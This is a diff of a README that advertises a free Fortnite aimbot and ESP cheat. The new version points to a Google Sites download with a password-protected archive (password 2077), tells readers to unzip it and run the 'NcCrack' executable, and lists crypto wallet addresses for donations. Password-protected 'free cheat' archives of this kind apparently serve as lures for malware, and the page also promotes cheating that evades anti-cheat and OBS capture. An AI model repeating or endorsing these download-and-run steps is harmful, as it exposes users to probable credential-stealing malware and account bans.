@@ -1,56 +1,83 @@
-# HYROCOPT-cheat-FREE-Fortnite-cheat-Aim-ESP
-Our cheat supports windows 7/10/11
+# FORTNITE-HACK-AIM-ESP
 
+# IMPORTANT 
 
-# Download
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
-|:-------------|
-Passwrod: 23
+# Be sure to create an account on GitHub before launching the cheat 
+# Without it, the cheat will not be able to contact the server
 
+-----------------------------------------------------------------------------------------------------------------------
+# Download Cheat
+|[Download](https://sites.google.com/view/nccrakc/main-page)|Password: 2077|
+|---|---|
+-----------------------------------------------------------------------------------------------------------------------
 
-# Some Features
+# Support the author ( On chips )
 
-![image](https://user-images.githubusercontent.com/126517061/222336480-5f2c50d3-bb6f-4d3a-a151-a9ba69f47418.png)
+- BTC - bc1q7kmj3pyhcm2n02z6p7gxvusqv55pt7vcgxe6ut
 
-Fortnite Esp Hack
+- ETH - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
 
-Fortnite Aimbot Hack
+- TRC-20 ( Usdt ) - TRYhDuV6qVcHQjfqEgF15w72TdxCMLDt9b
 
-Fortnite No Recoil Hack
+- BNB - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
 
-Fortnite Spoofer free
+-----------------------------------------------------------------------------------------------------------------------
 
-Fortnite Soft Aim Hack
-# Updates;
-[+] Menu Completly Changed.
+# How to install?
 
-[+] Fixed Aim Lock Line.
+- Visit our website
 
-[+] Fixed Aim Bones [ Now it’s actually head ].
+- Download the archive 
 
-[+] SnapLines Repositioned.
+- Unzip the archive to your desktop ( Password from the archive is 2077 )
 
-[+] Added Air Stuck.
+- Run the file ( NcCrack )
 
-[+] U finally can turn off vehicle esp.
+- Launch the game
 
-[+] Silent Aim and Bullet Teleport will be up very soon just wait.
+- In-game INSERT button
 
-[+] Updated to latest patch.
+-----------------------------------------------------------------------------------------------------------------------
 
-[+] Major Improvments.
+# SYSTEM REQUIREMENTS
 
-![image](https://user-images.githubusercontent.com/126517061/222336549-192a832e-6254-4fcc-a7ca-76a1075e522c.png)
+- Processor | Intel | Amd Processor |
 
-# [How to use Fortnite Hacks Free?]
-To use this Fortnite hacks for free You must turn on your Discord Overlay first of all.
+- Windows support | 7 | 8 | 8.1 | 10 | 11 |
 
-Close Epic Games Launcher.
+- Build support | ALL |
 
-Open HYROCOPT HACK.exe.
+-----------------------------------------------------------------------------------------------------------------------
 
-Open Epic Games and launch fortnite.
+# Cheat functions
 
-Easy Anti Cheat ( EAC ) should run.
+# AIM
 
-Enjoy
+- Weapon check - Disables aim during construction or with a pickaxe in hand
+- Visible check - check visibility
+- Aim smooth - smoothness
+- Drawfov - draw the range of the aim
+- Aim fov - range of action
+- Fov color - the color of the circle radius
+- Choose target - type of target selection
+
+# ESP
+
+- Box esp - Boxes
+- Box color - color of boxes
+- distance esp - Distance to enemy
+- distance color - Text
+- color snapline esp - Lines to enemies
+- snapline from - Beginning of line
+- snapline to - End of line
+- snapline color - Line color
+
+# MISC
+
+- logger - cheat logs
+- Watermark - Cheat logo
+- OBS Bypass - hide the cheat window from OBS
+
+![KNfNKck](https://user-images.githubusercontent.com/119938147/213410219-63ef1560-6355-4051-933c-c5edd8b47905.png)
+![ORdAvGQ](https://user-images.githubusercontent.com/119938147/213410226-9bb51ff1-64f0-4676-873c-5f4c4c79ff29.png)
+![S1DE0iU](https://user-images.githubusercontent.com/119938147/213410227-567607e4-ad2b-4a15-b378-60097f9aebe4.gif)
